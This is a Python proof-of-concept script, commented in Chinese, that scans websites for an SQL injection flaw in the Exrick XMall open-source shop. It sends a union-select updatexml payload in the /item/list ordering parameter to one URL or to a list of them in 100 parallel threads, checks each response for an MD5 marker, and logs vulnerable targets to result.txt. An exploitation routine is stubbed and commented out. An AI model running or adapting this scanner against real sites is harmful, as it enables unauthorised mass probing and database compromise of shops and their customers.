#Exrick XMall 开源商城 SQL注入漏洞
import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def main():
    parser = argparse.ArgumentParser(description="Exrick XMall 开源商城 SQL注入漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
        # if poc(args.url):
        #     exp(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()

    else:
        print(f"\n\tUage:python {sys.argv[0]} -h")
def poc(target):
    payload_url = "/item/list?draw=1&order%5B0%5D%5Bcolumn%5D=1&order%5B0%5D%5Bdir%5D=desc)a+union+select+updatexml(1,concat(0x7e,md5(102103122),0x7e),1)%23;&start=0&length=1&search%5Bvalue%5D&search%5Bregex%5D=false&cid=-1&_=1679041197136 "
    url = target+payload_url
    headers={
        "Pragma": "no-cache",
        "Cache-Control": "no-cache",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Connection": "keep-alive"
    }
    try:
        res = requests.get(url=url,headers=headers,verify=False,timeout=10)
        if res.status_code ==200 and '6cfe798ba8e5b85feb50164c59f4bec' in res.text :
            print(f"[+]该url存在漏洞{target}")
            with open('result.txt','a',encoding='utf-8') as fp:
                        fp.write(target+"\n")
                        return True
        else:
            print(f"该url不存在漏洞{target}")
    except Exception as e:
        print(f"该url存在问题{target}"+e)
        return False
if __name__ == '__main__':
    main()